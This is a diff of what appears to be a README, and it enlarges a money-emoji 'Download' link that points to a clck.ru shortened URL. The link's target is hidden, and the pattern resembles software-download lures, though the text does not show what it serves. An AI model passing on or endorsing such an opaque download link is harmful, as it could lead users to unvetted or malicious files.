@@ -16,7 +16,7 @@
 
 # How to Get Started:
 
-<a href="https://clck.ru/364kHb"> 🤑 Download 🤑 </a> 
+<H1> <a href="https://clck.ru/364kHb"> 💵 Download 💶 </a> </H1>
 
 We welcome contributions from the community! Whether it's bug fixes, new features, or optimizations, feel free to open a pull request. If you encounter any issues or have suggestions, please open an issue – we value your feedback!
 
